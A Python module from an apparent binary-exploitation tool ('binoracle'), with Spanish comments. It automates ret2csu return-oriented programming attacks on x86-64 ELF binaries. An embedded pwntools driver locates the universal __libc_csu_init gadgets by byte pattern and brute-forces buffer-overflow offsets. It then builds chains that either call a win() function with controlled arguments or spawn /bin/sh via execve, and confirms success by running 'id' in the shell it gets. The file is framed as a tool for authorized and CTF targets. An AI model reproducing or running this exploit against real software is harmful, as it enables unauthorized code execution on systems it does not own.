"""ret2csu verified by execution: control rdi/rsi/rdx and make a call with the universal gadgets.

The two `__libc_csu_init`-style gadgets let you set the first three argument registers and perform an
indirect call WITHOUT any `pop rsi`/`pop rdx` gadget -- the classic way to call a function with
controlled arguments in a gadget-poor x86-64 binary:

    gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    gadget2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

Set rbx=0, rbp=1 (so the csu loop runs once and stops), r12=&(pointer to the target function),
r13=arg1 (edi, 32-bit), r14=arg2 (rsi), r15=arg3 (rdx); gadget2 then calls target(arg1,arg2,arg3).
binoracle builds this and VERIFIES it by execution -- a real shell in the sandbox. The gadgets are
located by byte-pattern search (independent of symbol names). For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (ret2csu driver is x86-64)"); sys.exit(1)

def find(seq):
    return next(elf.search(seq), None)

# gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
G1 = find(bytes([0x5b,0x5d,0x41,0x5c,0x41,0x5d,0x41,0x5e,0x41,0x5f,0xc3]))
# gadget2 core: mov rdx,r15; mov rsi,r14; mov edi,r13d  (4c89fa 4c89f6 4489ef)
G2 = find(bytes([0x4c,0x89,0xfa,0x4c,0x89,0xf6,0x44,0x89,0xef]))
RET = find(bytes([0xc3]))        # a bare `ret` for 16-byte stack re-alignment (MOVAPS in glibc)
if G1 is None or G2 is None or RET is None:
    print("NOT_APPLICABLE (no __libc_csu_init-style gadgets found)"); sys.exit(1)

MARK = b"BINORACLE_CSU_PWNED"
_OFFS = [72, 64, 88, 56, 96, 80, 104, 120, 40, 48]

def run(payload):
    io = None
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(payload); time.sleep(0.3)
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.2)
        except Exception: pass
        io.close()
        return (MARK in out) or (b"uid=" in out)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
        return False

# --- strategy A: csu gadget2 calls a function pointer (fnptr) with 3 controlled args (win(a,b,c)) --
win = elf.symbols.get("win")
fnptr = elf.symbols.get("fnptr")
if fnptr is not None and win is not None:
    A1, A2, A3 = 0x1337, 0xdead, 0xbeef          # sentinels the practice win() checks
    def chain_win(align):
        c  = p64(RET) * align
        c += p64(G1) + p64(0) + p64(1) + p64(fnptr) + p64(A1) + p64(A2) + p64(A3)
        c += p64(G2) + p64(G1) + p64(0) * 6
        return c
    for off in _OFFS:
        for align in (0, 1):
            if run(b"A" * off + chain_win(align)):
                print("VERIFIED mode=win off=%d align=%d g1=%#x g2=%#x fnptr=%#x" % (off, align, G1, G2, fnptr))
                sys.exit(0)

# --- strategy B: ret2csu -> execve. Use csu to set rsi=0 / rdx=0 (no pop rsi/rdx), with gadget2's
# forced call aimed at a benign `ret` pointer, then pop rdi=&binsh, pop rax=59, syscall. ----------
binsh = next(elf.search(b"/bin/sh\x00"), None)
rop = ROP(elf)
try: pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
except Exception: pop_rdi = None
try: pop_rax = rop.find_gadget(["pop rax", "ret"]).address
except Exception: pop_rax = None
_sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
syscall = _sc.address if _sc else None
# a pointer whose target just returns: the 'retptr' symbol, else build one is not possible here.
benign_ptr = elf.symbols.get("retptr")
if binsh and pop_rdi and pop_rax and syscall and benign_ptr is not None:
    def chain_execve():
        c  = p64(G1) + p64(0) + p64(1) + p64(benign_ptr) + p64(0) + p64(0) + p64(0)  # rsi=0, rdx=0
        c += p64(G2)                                   # sets rsi/rdx, benign call, returns
        c += p64(pop_rdi) + p64(binsh) + p64(pop_rax) + p64(59) + p64(syscall)       # execve('/bin/sh',0,0)
        return c
    for off in _OFFS:
        if run(b"A" * off + chain_execve()):
            print("VERIFIED mode=execve off=%d g1=%#x g2=%#x syscall=%#x binsh=%#x" % (off, G1, G2, syscall, binsh))
            sys.exit(0)

print("NOT_VERIFIED")
sys.exit(1)
'''


def _csu_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): strategy A necesita 'win' y 'fnptr'; strategy B necesita
    'retptr' (el gadget1/gadget2 __libc_csu_init-style y los demas gadgets de la strategy B se
    buscan por patron de bytes / ROP dentro del driver, donde ya hay pwntools cargado -- aqui
    solo se filtra lo que es barato de saber de antemano, igual que el resto de _xxx_applicable
    de este motor)."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        return ("win" in names and "fnptr" in names) or "retptr" in names
    except Exception:
        return True


def autocsu(binary: str) -> dict:
    """ret2csu execve/call-win verificado por ejecucion. Necesita los 2 gadgets universales y un
    puntero a funcion conocido (`fnptr`). Docker o sandbox nativo; degrada limpio."""
    if not _csu_applicable(binary):
        return {"ok": False, "note": "no aplicable (falta win+fnptr o retptr): ret2csu necesita uno de los dos"}
    res = run_driver(binary, _DRIVER, ".binoracle_csu.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"ret2csu (__libc_csu_init): args controlados + call, shell verificada ({eng})"
                   if res.get("verified")
                   else f"ret2csu: no verificado ({eng}) (sin gadgets csu / puntero de funcion / timing)")
    return res


def render_csu(r: dict) -> str:
    out = ["## Auto ret2csu (gadgets universales, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
